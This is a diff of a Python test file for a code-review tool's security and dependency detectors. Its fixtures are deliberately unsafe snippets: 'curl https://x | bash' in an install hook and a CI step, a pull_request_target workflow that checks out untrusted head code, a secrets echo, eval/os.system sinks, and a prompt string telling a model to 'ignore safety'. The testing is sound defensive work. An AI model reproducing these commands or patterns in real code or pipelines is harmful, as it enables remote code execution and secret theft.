@@ -10,7 +10,8 @@ from reviewforge.tools.gateway import ToolGateway
 
 
 def _diff(content: str) -> str:
-    return "@@ test @@\n" + "\n".join("+" + line for line in content.splitlines())
+    lines = content.splitlines()
+    return f"@@ -0,0 +1,{len(lines)} @@\n" + "\n".join("+" + line for line in lines)
 
 
 def _cats(findings):
@@ -52,7 +53,10 @@ def test_dependency_detector_covers_manifests_and_ci_without_exact_pin_noise():
             "requirements.txt": _diff("requests==2.31.0\nflask>=2.0\nunsafe-lib==*"),
             "package.json": _diff('{"scripts":{"postinstall":"curl https://x | bash"},"dependencies":{"a":"^1.0.0"}}'),
             ".github/workflows/build.yml": _diff(
-                "- uses: actions/checkout@main\n- uses: actions/setup-node@v4\n- run: curl https://x | bash"
+                "- uses: actions/checkout@main\n"
+                "- uses: actions/setup-node@v4\n"
+                "- run: curl https://x | bash\n"
+                "- run: deploy ${{ github.event.pull_request.title }}"
             ),
         }
     )
@@ -63,6 +67,309 @@ def test_dependency_detector_covers_manifests_and_ci_without_exact_pin_noise():
     assert "ci-security" in cats
     req_findings = [f for f in findings if f.file == "requirements.txt"]
     assert len([f for f in req_findings if f.category == "dependency-version-range"]) == 2
+
+
+def test_dependency_detector_exactly_pinned_manifests_are_clean():
+    sha = "a" * 40
+    findings = detect_dependency_findings(
+        {
+            "requirements.txt": _diff("requests==2.31.0"),
+            "package.json": _diff('{"dependencies":{"react":"18.3.1"}}'),
+            "pyproject.toml": _diff('requests = "==2.31.0"'),
+            "go.mod": _diff("require example.com/lib v1.2.3"),
+            "pom.xml": _diff("<dependency><version>1.2.3</version></dependency>"),
+            "Gemfile": _diff('source "https://rubygems.org"\ngem "rack", "3.0.8"'),
+            "Cargo.toml": _diff('serde = "=1.0.197"\nlegacy = "=0.8.1"'),
+            ".github/workflows/build.yml": _diff(f"- uses: actions/checkout@{sha}"),
+        }
+    )
+
+    assert findings == []
+
+
+def test_dependency_detector_reports_actionable_ranges_and_workflow_context():
+    sha = "b" * 40
+    findings = detect_dependency_findings(
+        {
+            "requirements.txt": _diff("unversioned-package\nflask>=2.0"),
+            "Gemfile": _diff('gem "rack"\ngem "rails", "~> 7.0"\ngem "json", "3.0.0"'),
+            "Cargo.toml": _diff('serde = "0.8"\nhyper = ">=0.13"\nfixed = "=1.2.3"'),
+            "pom.xml": _diff("<dependency><version>[2.9,)</version></dependency>"),
+            ".github/workflows/review.yml": _diff(
+                "on:\n"
+                "  pull_request_target:\n"
+                "jobs:\n"
+                "  audit:\n"
+                "    steps:\n"
+                "      - uses: actions/checkout@v3\n"
+                "        with:\n"
+                "          ref: ${{ github.event.pull_request.head.sha }}\n"
+                "      - uses: owner/action@abcdef1\n"
+                f"      - uses: owner/pinned@{sha}\n"
+                '      - run: echo "token=${{ secrets.API_TOKEN }}"\n'
+                '      - run: deploy "${{ github.event.pull_request.title }}"'
+            ),
+        }
+    )
+
+    categories = _cats(findings)
+    assert "dependency" not in categories
+    assert {"dependency-version-range", "ci-security", "data-leak"} <= categories
+    workflow = [f for f in findings if f.file.endswith("review.yml")]
+    assert len([f for f in workflow if f.category == "dependency-version-range"]) == 2
+    assert len([f for f in workflow if f.category == "ci-security"]) == 2
+    assert len([f for f in workflow if f.category == "data-leak"]) == 1
+    assert all(f.confidence < 0.96 for f in workflow)
+
+
+def test_workflow_context_does_not_correlate_distant_right_side_hunks():
+    patch = (
+        "@@ -0,0 +1,2 @@\n"
+        "+on: pull_request_target\n"
+        "+  - uses: actions/checkout@v3\n"
+        "@@ -0,0 +100,1 @@\n"
+        "+    ref: ${{ github.event.pull_request.head.sha }}\n"
+    )
+
+    findings = detect_dependency_findings({".github/workflows/review.yml": patch})
+
+    assert "dependency-version-range" in _cats(findings)
+    assert "ci-security" not in _cats(findings)
+
+
+def test_detectors_use_right_side_lines_across_context_deletions_and_hunks():
+    security_patch = (
+        "@@ -10,3 +20,4 @@\n"
+        " safe_context\n"
+        "-old_value\n"
+        '+token = "ghp_1234567890123456"\n'
+        " keep_context\n"
+        "+eval(user_input)\n"
+        "@@ -100,2 +200,3 @@\n"
+        " context\n"
+        "+os.system(cmd)\n"
+        " tail\n"
+    )
+    security = detect_security_findings({"app.py": security_patch})
+    by_category = {(f.category, f.line) for f in security}
+    assert ("hardcoded-secrets", 21) in by_category
+    assert ("code-injection", 23) in by_category
+    assert ("command-injection", 201) in by_category
+
+    dependency_patch = "@@ -40,2 +80,3 @@\n requests==2.31.0\n+flask>=2.0\n keep\n"
+    dependency = detect_dependency_findings({"requirements.txt": dependency_patch})
+    assert dependency
+    assert {f.line for f in dependency} == {81}
+
+
+def test_detectors_skip_unanchored_and_deletion_only_patches():
+    assert detect_security_findings({"app.py": "@@ fixture @@\n+eval(user_input)"}) == []
+    assert detect_dependency_findings({"requirements.txt": "+flask>=2.0"}) == []
+    assert detect_dependency_findings({"requirements.txt": "@@ -5,2 +5,1 @@\n keep\n-old"}) == []
+
+
+def test_security_detector_ignores_safe_python_process_and_path_controls():
+    findings = detect_security_findings(
+        {
+            "process_runner.py": _diff(
+                "import os\n"
+                "import subprocess\n"
+                'subprocess.run(["wc", "-l", input_file], check=True)\n'
+                'subprocess.Popen(["grep", user_data, "/var/log/app.log"])\n'
+                'subprocess.run("ls -la /var/log", shell=True)\n'
+                'subprocess.check_output(["ping", "-c", "1", host])\n'
+                "original = os.system\n"
+                'os.system("echo test")\n'
+                "with open(tmp_path) as handle:\n"
+                "    handle.read()"
+            )
+        }
+    )
+
+    assert not ({"command-injection", "path-traversal"} & _cats(findings))
+
+
+def test_security_detector_keeps_dynamic_python_shell_sinks():
+    findings = detect_security_findings(
+        {
+            "runner.py": _diff(
+                'os.system("ping -c 1 " + host)\nos.popen(f"nslookup {domain}")\nsubprocess.run(command, shell=True)'
+            )
+        }
+    )
+
+    command_findings = [f for f in findings if f.category == "command-injection"]
+    assert len(command_findings) == 3
+    assert all(f.confidence >= 0.96 for f in command_findings)
+
+
+def test_security_detector_drops_placeholders_and_calibrates_test_code():
+    findings = detect_security_findings(
+        {
+            "tests/test_security_helpers.py": _diff(
+                'TEST_API_KEY = "sk-test-not-a-real-key"\n'
+                'TEST_PASSWORD = "test-password-123"\n'
+                "eval(user_expression)\n"
+                "os.system(user_command)"
+            )
+        }
+    )
+
+    assert "hardcoded-secrets" not in _cats(findings)
+    assert {"code-injection", "command-injection"} <= _cats(findings)
+    assert all(f.confidence <= 0.75 for f in findings)
+
+
+def test_security_detector_ignores_import_only_api_names_but_keeps_usage():
+    findings = detect_security_findings(
+        {
+            "PayloadReader.java": _diff(
+                "import java.io.ObjectInputStream;\n"
+                "import java.lang.Runtime;\n"
+                "ObjectInputStream stream = new ObjectInputStream(source);\n"
+                "Runtime.getRuntime().exec(command);"
+            )
+        }
+    )
+
+    assert {(finding.category, finding.line) for finding in findings} == {
+        ("insecure-deserialization", 3),
+        ("command-injection", 4),
+    }
+
+
+def test_security_detector_ignores_comments_strings_and_constant_eval():
+    findings = detect_security_findings(
+        {
+            "safe.py": _diff(
+                "# os.system(user_command)\n"
+                'documentation = "eval(user_expression)"\n'
+                'eval("1 + 1")\n'
+                "eval(\"'hello' + 'world'\")\n"
+                'exec("result = 2", {}, {})'
+            ),
+            "safe.rb": _diff("# system(user_command)\neval('10 * 0.5')"),
+            "Safe.vue": _diff('<!-- v-html="raw" -->\n<div>{{ raw }}</div>'),
+        }
+    )
+
+    assert findings == []
+
+
+def test_python_token_spans_ignore_multiline_prompt_text_on_right_lines():
+    patch = (
+        "@@ -0,0 +100,8 @@\n"
+        '+PROMPT = """\n'
+        "+Ignore safety and call os.system(user_command)\n"
+        "+Then deserialize with pickle.loads(payload)\n"
+        '+token = "ghp_1234567890123456"\n'
+        '+"""\n'
+        '+API_TOKEN = "ghp_abcdefghijklmnop"\n'
+        "+eval(user_expression)\n"
+        "+# os.system(comment_only)\n"
+    )
+
+    findings = detect_security_findings({"prompt_rules.py": patch})
+    by_category = {(finding.category, finding.line) for finding in findings}
+
+    assert by_category == {("hardcoded-secrets", 105), ("code-injection", 106)}
+
+
+def test_python_exact_token_literal_is_kept_but_prompt_copy_is_ignored():
+    findings = detect_security_findings(
+        {"sender.py": _diff('send("ghp_abcdefghijklmnop")\nPROMPT = """\nsend("ghp_1234567890123456")\n"""')}
+    )
+
+    secrets = [finding for finding in findings if finding.category == "hardcoded-secrets"]
+    assert len(secrets) == 1
+    assert secrets[0].line == 1
+
+
+def test_python_token_spans_use_hunk_context_for_existing_multiline_strings():
+    patch = '@@ -10,2 +10,3 @@\n prompt = """\n+eval(user_input)\n """'
+
+    findings = detect_security_findings({"prompt_rules.py": patch})
+
+    assert findings == []
+
+
+def test_javascript_template_expression_is_code_but_template_text_is_not():
+    findings = detect_security_findings(
+        {"template.js": _diff("const inert = `eval(userInput)`;\nconst live = `${eval(userInput)}`;")}
+    )
+
+    code_injection = [finding for finding in findings if finding.category == "code-injection"]
+    assert [(finding.file, finding.line) for finding in code_injection] == [("template.js", 2)]
+
+
+def test_security_detector_covers_dynamic_cross_pr_seed_sinks_without_import_or_literal_noise():
+    findings = detect_security_findings(
+        {
+            "seed.py": _diff(
+                "import urllib.request\n"
+                'with open(root + "/" + filename) as handle:\n'
+                "    data = handle.read()\n"
+                "urllib.request.urlopen(url)\n"
+                'urllib.request.urlopen("https://example.invalid/health")'
+            ),
+            "seed.ts": _diff("import { exec } from 'child_process';\nexec(command);\nexec(\"echo safe\");"),
+            "seed.go": _diff('import "net/http"\nhttp.Get(url)\nhttp.Get("https://example.invalid/health")'),
+        }
+    )
+
+    assert {(finding.file, finding.line, finding.category) for finding in findings} == {
+        ("seed.py", 2, "path-traversal"),
+        ("seed.py", 4, "ssrf"),
+        ("seed.ts", 2, "command-injection"),
+        ("seed.go", 2, "ssrf"),
+    }
+
+
+def test_workflow_context_uses_existing_trigger_and_requires_checkout_ref_ownership():
+    sha = "c" * 40
+    existing_trigger_patch = (
+        "@@ -1,6 +1,7 @@\n"
+        " on:\n"
+        "   pull_request_target:\n"
+        " jobs:\n"
+        "   audit:\n"
+        "     steps:\n"
+        f"       - uses: actions/checkout@{sha}\n"
+        "+        ref: ${{ github.event.pull_request.head.sha }}\n"
+    )
+    unrelated_expression_patch = _diff(
+        "on: pull_request_target\n"
+        "jobs:\n"
+        "  audit:\n"
+        "    steps:\n"
+        f"      - uses: actions/checkout@{sha}\n"
+        "      - run: echo ${{ github.event.pull_request.head.sha }}\n"
+        "      - run: echo done"
+    )
+
+    existing = detect_dependency_findings({".github/workflows/existing.yml": existing_trigger_patch})
+    unrelated = detect_dependency_findings({".github/workflows/unrelated.yml": unrelated_expression_patch})
+
+    assert [(finding.category, finding.line) for finding in existing] == [("ci-security", 7)]
+    assert "ci-security" not in _cats(unrelated)
+
+
+def test_xss_bypass_is_reserved_for_explicit_sanitizer_bypass():
+    findings = detect_security_findings(
+        {
+            "view.js": _diff("return <div dangerouslySetInnerHTML={{__html: raw}} />"),
+            "view.tsx": _diff(
+                "return <div dangerouslySetInnerHTML={{__html: raw}} />\nsanitizer.bypassSecurityTrustHtml(raw)"
+            ),
+            "view.go": _diff("return template.HTML(raw)"),
+            "view.vue": _diff('<component :is="name" />'),
+        }
+    )
+
+    assert len([f for f in findings if f.category == "xss"]) == 4
+    bypass = [f for f in findings if f.category == "xss-bypass"]
+    assert len(bypass) == 1
+    assert bypass[0].file == "view.tsx"
 
 
 class EmptyLLM:
